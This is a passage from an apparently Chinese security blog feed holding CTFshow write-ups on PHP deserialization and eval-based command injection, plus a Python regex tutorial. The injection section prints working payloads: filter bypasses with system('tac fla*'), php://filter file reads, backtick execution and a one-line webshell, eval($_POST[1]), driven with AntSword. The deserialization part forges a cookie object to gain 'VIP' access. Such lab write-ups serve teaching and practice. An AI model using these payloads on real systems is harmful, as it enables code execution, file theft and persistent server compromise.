language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题与上一题相似，唯一不同的是代码中没有能够改变isvip值的代码，并且要传入cookie，将其值反序列化后的参数才入后续语句。分析完题目可以开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将不必要的代码删除，将isvip的值改为true，对其序列化，上传的时候记得要提交url后的语句，防止出错。因此加上一句 urlencode()函数。得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>将其写入cookie并且传入username和password，即可获得flag</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/01.png"></p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/02.png"></p><p>这里我用的是火狐浏览器的 hackbar插件。</p><p>获得flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;a1838595-<span class="number">0</span>b37-<span class="number">4448</span>-a2ac-c525451881e1&#125;</span><br></pre></td></tr></table></figure><p>这题野非常简单。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-1</title>
      <link href="/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/"/>
      <url>/2023/06/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-254"><a href="#题目来源：CTFshow-web入门-php反序列化-254" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-254"></a>题目来源：CTFshow web入门-php反序列化-254</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>分析题目发现没有魔术方法，能供输出flag的代码在 vipOneKeyGetFlag() 函数中，如果类ctfShowUser中的 $this-&gt;isVip 值为真。就能输出flag。但ctfShowUser中的参数isvip被定义为false，分析题目后又发现当 $u,$p的值与类中的username,password相等时，就会将isvip的值改为true，那么思路就明确了，直接传参，获得flag。这题非常简单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//142282b0-a46d-4251-9f55-e44313dc42e9.challenge.ctf.show/?username=xxxxxx&amp;password=xxxxxx</span></span><br></pre></td></tr></table></figure><p>即可获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">9</span>cbe4237-<span class="number">5851</span>-<span class="number">4</span>ed7-<span class="number">9</span>afb-<span class="number">91</span>b84d96ef21&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-正则表达式</title>
      <link href="/2023/06/02/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2023/06/02/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="python的正则学习"><a href="#python的正则学习" class="headerlink" title="python的正则学习"></a>python的正则学习</h1><h3 id="运用一"><a href="#运用一" class="headerlink" title="运用一"></a>运用一</h3><p>已知字符串a&#x3D;“aAsmr3idd4bgs7Dlsf9eAF”</p><p>（1）请将a字符串中的数字取出，并输出为一个新的字符串，要求使用正则表达式完成；</p><p>（2）请将字符串a中的大写字母换为小写，小写字母换成大写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a=<span class="string">&quot;aAsmr3idd4bgs7Dlsf9eAF&quot;</span></span><br><span class="line">lst=re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line">st=lst.findall(a)</span><br><span class="line">st1=<span class="string">&#x27;&#x27;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> st)</span><br><span class="line"><span class="built_in">print</span>(st1)</span><br><span class="line"></span><br><span class="line">result = re.sub(<span class="string">r&#x27;[a-zA-Z]&#x27;</span>, <span class="keyword">lambda</span> x: x.group(<span class="number">0</span>).upper() <span class="keyword">if</span> x.group(<span class="number">0</span>).islower() <span class="keyword">else</span> x.group(<span class="number">0</span>).lower(), a)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>第一小问中规中矩，只要求匹配数字。第二个小问难就难在大小写转换，这里可以灵活运用关键字：lambda，<strong>lambda</strong> 函数通常会作为参数传递给高阶函数，例如 <strong><code>map()</code>、<code>filter()</code>、<code>reduce()</code></strong> 等函数，用于对序列进行转换、筛选、累积等操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure><p>arguments是函数的参数列表，用逗号分隔；experession是函数的返回值，也是一个表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = re.sub(<span class="string">r&#x27;[a-zA-Z]&#x27;</span>, <span class="keyword">lambda</span> x: x.group(<span class="number">0</span>).upper() <span class="keyword">if</span> x.group(<span class="number">0</span>).islower() <span class="keyword">else</span> x.group(<span class="number">0</span>).lower(), a)</span><br></pre></td></tr></table></figure><p>其中这句代码的含义就是将正则匹配的内容进行判断，如果是大写，则转变为小写，如果是小写，则转便为大写。</p><h3 id="运用二"><a href="#运用二" class="headerlink" title="运用二"></a>运用二</h3><p>根据下列字符串构成规律写出正则表达式，实现对测试字符串的搜索。假设待搜索字符串为：小明的身份证号码是 1234567890111，手机号码是 13508826666，私人邮箱是 <a href="mailto:&#x64;&#x61;&#x69;&#108;&#67;&#77;&#x40;&#111;&#x75;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#x6f;&#x6d;">&#x64;&#x61;&#x69;&#108;&#67;&#77;&#x40;&#111;&#x75;&#116;&#x6c;&#111;&#x6f;&#107;&#46;&#99;&#x6f;&#x6d;</a>,公司邮箱是 <a href="mailto:&#x31;&#x32;&#51;&#x34;&#x35;&#54;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#x31;&#x32;&#51;&#x34;&#x35;&#54;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a> (1)从字符串中提取合法的18位身份证号码；(2)从字符串中提取合法的E-mail地址；(3)从字符串中提取合法的11位手机号码。</p><p>我们先分析要匹配的字符串，先分析身份证号码。总共由18位数字构成，前6位表示地区的特别号码，第7、8、9、10位为年份，且7、8位应为19或者20（因为有身份证的人都是19多少年或者20多少年），第11、12位表示月份，则11与12位数字构成的月份只能在01-12之间。第13，14位表示日期，则两位数必须小于31。15、16、17表示任意的3位数字，18位数必须是数字或者字母x。</p><p>根据分析就可以开始构造正则表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">r&#x27;\b[1-9]\d&#123;5&#125;(19|20)\d&#123;2&#125;(0\d|1[0-2])([0-2]\d|3[0-1])\d&#123;3&#125;[0-9X]\b&#x27;</span></span><br></pre></td></tr></table></figure><p>电话号码不多说，特别基础，如果电话号码弄不来的同学建议再回去看下知识点。</p><p>编写程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">lst=<span class="string">&#x27;小明的身份证号码是 25364720210604002X,手机号码是 13508826666,私人邮箱是 dailCM@outlook.com,公司邮箱是 123456@qq.com&#x27;</span></span><br><span class="line">id_pattern = <span class="string">r&#x27;\b[1-9]\d&#123;5&#125;(19|20)\d&#123;2&#125;(0\d|1[0-2])([0-2]\d|3[0-1])\d&#123;3&#125;[0-9X]\b&#x27;</span></span><br><span class="line">id_match = re.search(id_pattern, lst)</span><br><span class="line"><span class="keyword">if</span> id_match:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;身份证号码：&quot;</span>, id_match.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到身份证号码&quot;</span>)</span><br><span class="line"></span><br><span class="line">email_pattern = <span class="string">r&#x27;\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,&#125;\b&#x27;</span></span><br><span class="line">email_match = re.search(email_pattern, lst)</span><br><span class="line"><span class="keyword">if</span> email_match:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;E-mail 地址：&quot;</span>, email_match.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到 E-mail 地址&quot;</span>)</span><br><span class="line"></span><br><span class="line">phone_pattern = <span class="string">r&#x27;\b1[3-9]\d&#123;9&#125;\b&#x27;</span></span><br><span class="line">phone_match = re.search(phone_pattern, lst)</span><br><span class="line"><span class="keyword">if</span> phone_match:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;电话号码：&quot;</span>, phone_match.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到电话号码&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/../imgs/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1.png"></p><p>这样正则表达式的运用就结束啦。 </p><p>正则表达式不唯一，慢慢分析就会有结果，最好的学习方式就是不断练习。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python-正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP命令执行</title>
      <link href="/2023/06/02/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/06/02/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>经过php代码审计后根据代码危险函数产生的漏洞的利用</p><h1 id="以CTFshow-web入门-命令执行-29为例"><a href="#以CTFshow-web入门-命令执行-29为例" class="headerlink" title="以CTFshow web入门-命令执行-29为例"></a>以CTFshow web入门-命令执行-29为例</h1><p>打开题目分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这串代码它首先检查是否有 GET 请求中有 <code>c</code> 参数。如果有，它会将参数值 <code>$c</code> 赋给 <code>$c</code> 变量。然后，它会检查 <code>$c</code> 是否包含字符串 “flag”，如果包含就不会执行 <code>$c</code> 的内容，否则会使用 <code>eval()</code> 函数执行 <code>$c</code>。</p><p>关键函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#是PHP中一个常用的函数，用于检查变量是否已经被设置并且非 NULL。如果给定的变量存在且其值不为 NULL，则返回 true，否则返回 false</span></span><br></pre></td></tr></table></figure><p>这里用于检测GET传入的参数$c是否存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#是PHP中用于执行正则表达式匹配的函数，它可以在给定的字符串中查找模式匹配，如果匹配成功，返回 1，否则返回 0。该函数需要传入两个参数：正则表达式模式和要搜索的字符串。还可以传递第三个参数，将匹配结果存储到其中。</span></span><br></pre></td></tr></table></figure><p>这里加上”!”，用于过滤特殊字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>() <span class="comment">#函数用于将字符串作为PHP代码执行。在执行时，该函数将传递的字符串作为 PHP 代码来执行。</span></span><br></pre></td></tr></table></figure><p>这题的关键就是这个eval()函数。eval()函数存在一些潜在的安全风险，因为它会把字符串作为 PHP 代码执行。如果输入的字符串包含恶意代码，攻击者就可以执行任意 PHP 代码，可能会导致系统被入侵、数据泄露等严重后果。因此，在使用eval()函数时，一定要非常小心，并确保输入的字符串是可信的。为了防止代码注入攻击，通常建议避免使用eval()函数，尽量采用其他更加安全的方式来实现需要动态执行代码的功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>如果变量$c中不包含字符串”flag”（不区分大小写），则执行$c中的代码。这个if语句中的作用是限制$c中不能包含”flag”，以避免可能存在的<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">安全漏洞</a>。</p><p>因为我们传入的参数能被当作php代码执行，则我们使用一些系统指令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这句代码意思是查看当前目录下的所有文件，因为c会被当做php代码执行，更据php语法，语句结束时要加上”;”。</p><p>看到目录下存在flag.php和index.php。而我们需要的flag就在flag.php下，但是由于我们的flag被系统过滤，则想到使用一些绕过方式来躲过系统的检测</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/01.png"></p><h3 id="法一-通配符-‘-‘"><a href="#法一-通配符-‘-‘" class="headerlink" title="法一 通配符 ‘ * ‘"></a>法一 通配符 ‘ * ‘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不知道通配符’ * ‘的小伙伴可自行搜查， 这里不过多解释</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/02.png"></p><h3 id="法二-占位符’-‘"><a href="#法二-占位符’-‘" class="headerlink" title="法二 占位符’ ? ‘"></a>法二 占位符’ ? ‘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla?.php&#x27;</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla?.???&#x27;</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/03.png"></p><p>不知道占位符的小伙伴请自行搜查 </p><h3 id="法三-复制’cp’"><a href="#法三-复制’cp’" class="headerlink" title="法三 复制’cp’"></a>法三 复制’cp’</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cp fla* 1.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p>将flag.php中的内容复制到1.txt中，直接在URL中输入访问1.txt即可</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/04.png"></p><h3 id="法四-内敛执行-（反字节符）"><a href="#法四-内敛执行-（反字节符）" class="headerlink" title="法四 内敛执行 （反字节符）"></a>法四 内敛执行 （反字节符）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `tac fla*`;</span><br></pre></td></tr></table></figure><p>在 PHP 中，（反引号）是一个用于执行 shell 命令并返回其输出结果的<a href="https://so.csdn.net/so/search?q=%E8%AF%AD%E6%B3%95%E7%B3%96&spm=1001.2101.3001.7020">语法糖</a>。因此，当你在URL 中使用 <code>echo ``tac fla*</code> 时，PHP 将执行 shell 命令 <code>tac fla*</code> 并返回其输出结果。,因为有反字节符，要核对一下是否转义，需要再在页面上确认一下。</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/05.png"></p><h3 id="法五-利用参数输入-eval"><a href="#法五-利用参数输入-eval" class="headerlink" title="法五 利用参数输入+eval"></a>法五 利用参数输入+eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>由于系统只会检测$c中的内容，则我们通过eval()函数构造参数1巧妙绕过</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/05-16856927569757.png"></p><h3 id="法六-利用参数输入-include"><a href="#法六-利用参数输入-include" class="headerlink" title="法六 利用参数输入+include"></a>法六 利用参数输入+include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>使用include将1包含进来，1再使用php伪协议使用PHP内部设置的过滤器，将flag.php文件读取并以base64编码的格式返回</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/06-16856928010309.png"></p><p> 将这串编码使用base64解码得到：</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/07.png"></p><h3 id="法七-一句话木马"><a href="#法七-一句话木马" class="headerlink" title="法七 一句话木马"></a>法七 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>输入c后，使用中国蚁剑，添加该URL</p><p><img 